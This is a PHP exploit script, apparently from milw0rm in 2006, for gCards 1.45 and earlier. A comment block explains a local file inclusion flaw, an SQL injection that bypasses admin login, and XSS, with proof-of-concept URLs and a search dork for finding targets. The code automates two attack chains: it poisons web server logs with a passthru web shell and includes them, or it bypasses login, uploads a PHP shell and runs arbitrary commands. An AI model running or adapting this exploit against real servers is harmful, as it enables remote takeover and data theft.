@@ -1,0 +1,362 @@
+#!/usr/bin/php -q -d short_open_tag=on
+<?
+echo "gCards <= 1.45 multiple vulnerabilities\r\n";
+echo "by rgod rgod@autistici.org\r\n";
+echo "site: http://retrogod.altervista.org\r\n\r\n";
+echo "Sun-Tzu:\"At first, then, exhibit the coyness of a maiden, until the\r\n";
+echo "enemy gives you an opening; afterwards emulate the rapidity of a\r\n";
+echo "running hare, and it will be too late for the enemy to oppose you.\"\r\n";
+
+echo "dork: \"powered by gcards\"\r\n\r\n";
+
+/*
+
+explaination:
+software site: http://www.gregphoto.net/gcards/index.php
+
+i) vulnerable code in inc/setLang.php:
+
+<?
+	if ($page->languageredirect == $_SERVER['PHP_SELF']) {
+		if (isset($_GET['setLang'])) $_SESSION['setLang'] = $_GET['setLang'];
+	}
+
+	$langFile = $page->relpath.'inc/lang/'.$lang[$_SESSION['setLang']]['file'];
+
+	if (file_exists($langFile)) {
+		include_once($langFile);
+	}
+	else {
+		echo "Could not find language file $langFile";
+	}
+?>
+
+this code is included by main script, so ... arbitrary local inclusion, poc:
+
+http://[target]/[path]/index.php?setLang=suntzu&lang[suntzu][file]=../../../../../../../../../../../var/log/httpd/access_log
+
+this works regardless of any magic_quotes_gpc settings, apart open_basedir
+restrictions obviously
+
+ii) also we have SQL injection in admin authentication procedure, admin/loginfunction.php
+at lines 28-38:
+
+...
+	$username = $_POST['username'];
+	$userpass = $_POST['userpass'];
+	if ($username && $userpass)
+	{
+		include('../inc/adodb/adodb.inc.php');	   # load code common to ADOdb
+		include('../config.php');
+		$ADODB_FETCH_MODE = ADODB_FETCH_ASSOC;
+		$conn = &ADONewConnection('mysql');	# create a connection
+		$conn->Connect($dbhost,$dbuser,$dbpass,$dbdatabase);
+		$pass = md5($userpass);
+		$sqlstmt = "SELECT role FROM ".$tablePrefix."cardusers WHERE username='$username' AND userpass='$pass'";
+...
+
+login as admin typing:
+
+username: 'or'suntzu'='suntzu'/*
+password: [whatever]
+
+this works with magic_quotes_gpc=Off
+
+once you are admin, you can upload php files, files are renamed but gcards keep
+php extension, so you can launch commands from them
+
+iii)xss:
+
+http://[target]/[path]/index.php?setLang=suntzu&lang[suntzu][file]=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+
+this exploit does the dirty work for i) and ii)
+
+                                                                              */
+if ($argc<5) {
+echo "Usage: php ".$argv[0]." host path action cmd OPTIONS\r\n";
+echo "host:      target server (ip/hostname)\r\n";
+echo "path:      path to gcards\r\n";
+echo "action:    1 - launch commands through arbitrary local inclusion\r\n";
+echo "               (no php.ini restriction)\r\n";
+echo "           2 - launch commands through sql injection/admin auth bypass\r\n";
+echo "               (works with magic_quotes_gpc = Off\r\n";
+echo "cmd:       a shell command\r\n";
+echo "Options:\r\n";
+echo "   -p[port]:    specify a port other than 80\r\n";
+echo "   -P[ip:port]: specify a proxy\r\n";
+echo "Examples:\r\n";
+echo "php ".$argv[0]." localhost /gcards/ 2 cat ./../config.php\r\n";
+echo "php ".$argv[0]." localhost /gcards/ 1 cat config.php\r\n";
+echo "php ".$argv[0]." localhost /gcards/ 1 cat config.php -p81\r\n";
+echo "php ".$argv[0]." localhost /gcards/ 1 cat config.php -P1.1.1.1:80\r\n";
+die;
+}
+
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+  #debug
+  #echo "\r\n".$html;
+}
+
+function make_seed()
+{
+   list($usec, $sec) = explode(' ', microtime());
+   return (float) $sec + ((float) $usec * 100000);
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$action=$argv[3];
+$cmd="";$port=80;$proxy="";
+
+for ($i=4; $i<=$argc-1; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if (($temp<>"-p") and ($temp<>"-P"))
+{$cmd.=" ".$argv[$i];}
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+}
+$cmd=urlencode($cmd);
+
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+echo "action selected -> ".$action."\r\n";
+if ($action=="1")
+{
+  echo "[1] Injecting some code in log files...\r\n";
+  $CODE ='<?php ob_clean();echo 666;if (get_magic_quotes_gpc()) {$_GET[cmd]=striplashes($_GET[cmd]);}';
+  $CODE.='passthru($_GET[cmd]);echo 666;die;?>';
+  $packet.="GET ".$p.$CODE." HTTP/1.1\r\n";
+  $packet.="User-Agent: ".$CODE."\r\n";
+  $packet.="Host: ".$host."\r\n";
+  $packet.="Connection: close\r\n\r\n";
+  #debug
+  #echo quick_dump($packet);
+  sendpacketii($packet);
+
+  # fill with possible locations
+  $paths= array (
+  "../../../../../../../../../../var/log/httpd/access_log",
+  "../../../../../../../../../../var/log/httpd/error_log",
+  "../apache/logs/error.log",
+  "../apache/logs/access.log",
+  "../../apache/logs/error.log",
+  "../../apache/logs/access.log",
+  "../../../apache/logs/error.log",
+  "../../../apache/logs/access.log",
+  "../../../../apache/logs/error.log",
+  "../../../../apache/logs/access.log",
+  "../../../../../../../../../../etc/httpd/logs/acces_log",
+  "../../../../../../../../../../etc/httpd/logs/acces.log",
+  "../../../../../../../../../../etc/httpd/logs/error_log",
+  "../../../../../../../../../../etc/httpd/logs/error.log",
+  "../../../../../../../../../../var/www/logs/access_log",
+  "../../../../../../../../../../var/www/logs/access.log",
+  "../../../../../../../../../../usr/local/apache/logs/access_log",
+  "../../../../../../../../../../usr/local/apache/logs/access.log",
+  "../../../../../../../../../../var/log/apache/access_log",
+  "../../../../../../../../../../var/log/apache/access.log",
+  "../../../../../../../../../../var/log/access_log",
+  "../../../../../../../../../../var/www/logs/error_log",
+  "../../../../../../../../../../var/www/logs/error.log",
+  "../../../../../../../../../../usr/local/apache/logs/error_log",
+  "../../../../../../../../../../usr/local/apache/logs/error.log",
+  "../../../../../../../../../../var/log/apache/error_log",
+  "../../../../../../../../../../var/log/apache/error.log",
+  "../../../../../../../../../../var/log/access_log",
+  "../../../../../../../../../../var/log/error_log"
+  );
+
+  for ($i=0; $i<=count($paths)-1; $i++)
+  {
+    $j=$i+2;
+    echo "[".$j."] Trying with ".$paths[$i]."\r\n";
+    $xpl=urlencode($paths[$i]);
+    $packet ="GET ".$p."index.php?cmd=".$cmd."&setLang=suntzu&lang[suntzu][file]=".$xpl." HTTP/1.0\r\n";
+    $packet.="Host: ".$host."\r\n";
+    $packet.="Connection: Close\r\n\r\n";
+    #debug, shows packets in a nice format
+    #echo quick_dump($packet);
+    sendpacketii($packet);
+
+    if (strstr($html,"666")){
+      echo "Exploit succeeded...\r\n";
+      $temp=explode("666",$html);
+      echo $temp[1];
+      die;
+    }
+  }
+
+}
+else
+if ($action=="2")
+{   echo "[1] Injecting some SQL statements in admin login username field...\r\n";
+    $sql=urlencode("'or'suntzu'='suntzu'/*");
+    $data="username=".$sql;
+    $data.="&userpass=suntzu";
+    $packet ="POST ".$p."admin/admin.php HTTP/1.1\r\n";
+    $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+    $packet.="Host: ".$host."\r\n";
+    $packet.="Content-Length: ".strlen($data)."\r\n";
+    $packet.="Connection: Close\r\n\r\n";
+    $packet.=$data;
+    #echo quick_dump($packet);
+    sendpacketii($packet);
+    if (strstr($html,"gCards Administration Console"))
+    {echo "Sql injection succeeded...\r\n";}
+    else
+    {die("Not succeeded, maybe we have magic_quotes_gpc on here...\r\n");}
+    $temp=explode("Set-Cookie: ",$html);
+    $temp2=explode(" ",$temp[1]);
+    $cookie=$temp2[0];
+    echo "Cookie -> ".$cookie."\r\n";
+    echo "[2] Let's retrieve a category name to upload a file in ...\r\n";
+    $packet ="GET ".$p."admin/cards.php HTTP/1.1\r\n";
+    $packet.="Host: ".$host."\r\n";
+    $packet.="Cookie: ".$cookie."\r\n";
+    $packet.="Connection: Close\r\n\r\n";
+    #echo quick_dump($packet);
+    sendpacketii($packet);
+    $temp=explode("<option value=\"",$html);
+    $temp2=explode("\"",$temp[1]);
+    $catid=$temp2[0];
+    echo "catid -> ".$catid."\r\n";
+    if ($catid=="") {$catid=1;}
+    echo "[3] Uploading a php file...\r\n";
+$data='-----------------------------7d613b1d0448
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+250000
+-----------------------------7d613b1d0448
+Content-Disposition: form-data; name="cardname"
+
+suntzu
+-----------------------------7d613b1d0448
+Content-Disposition: form-data; name="catid"
+
+'.$catid.'
+-----------------------------7d613b1d0448
+Content-Disposition: form-data; name="userfile"; filename="suntzu.php"
+Content-Type: application/octet-stream
+
+<?php echo 666;ini_set("max_execution_time",0);passthru($_GET[cmd]);echo 666;?>
+-----------------------------7d613b1d0448
+Content-Disposition: form-data; name="userthumb"; filename="suntzu.php"
+Content-Type: application/octet-stream
+
+<?php echo 666;ini_set("max_execution_time",0);passthru($_GET[cmd]);echo 666;?>
+-----------------------------7d613b1d0448
+Content-Disposition: form-data; name="submit"
+
+Upload
+-----------------------------7d613b1d0448
+';
+    $packet ="POST ".$p."admin/upload.php HTTP/1.1\r\n";
+    $packet.="Content-Type: multipart/form-data; boundary=---------------------------7d613b1d0448\r\n";
+    $packet.="Host: ".$host."\r\n";
+    $packet.="Content-Length: ".strlen($data)."\r\n";
+    $packet.="Connection: Close\r\n";
+    $packet.="Cookie: ".$cookie."\r\n\r\n";
+    $packet.=$data;
+    #echo quick_dump($packet);
+    sendpacketii($packet);
+    if (strstr($html,"successfully"))
+    {echo "Succeeded...\r\n";}
+    else
+    {die("For some reason...Not succeeded\r\n");}
+    echo "[4] Let's retrieve the new filename ...\r\n";
+    $packet ="GET ".$p."admin/cards.php HTTP/1.1\r\n";
+    $packet.="Host: ".$host."\r\n";
+    $packet.="Cookie: ".$cookie."\r\n";
+    $packet.="Connection: Close\r\n\r\n";
+    #echo quick_dump($packet);
+    sendpacketii($packet);
+    $temp=explode("suntzu.php",$html);
+    $temp2=explode("<td>",$temp[count($temp)-2]);
+    $temp=$temp2[count($temp2)-1];
+    $newfile=$temp."suntzu.php";
+    if ($newfile=="") {die("For some reason, exploit failed...");}
+    echo "File renamed to: ".$newfile."\r\n";
+    echo "[5] Launch commands ...\r\n";
+    $packet ="GET ".$p."images/".$newfile."?cmd=".$cmd." HTTP/1.1\r\n";
+    $packet.="Host: ".$host."\r\n";
+    $packet.="Connection: Close\r\n\r\n";
+    #echo quick_dump($packet);
+    sendpacketii($packet);
+    if (strstr($html,"666"))
+     {
+       echo "Exploit succeeded...\r\n";
+       $temp=explode("666",$html);
+       echo $temp[1];
+       die;
+     }
+}
+else
+{die ("Wrong action...\r\n");}
+//if you are here...
+echo "Exploit failed...\r\n";
+?>
+
+# milw0rm.com [2006-03-20]
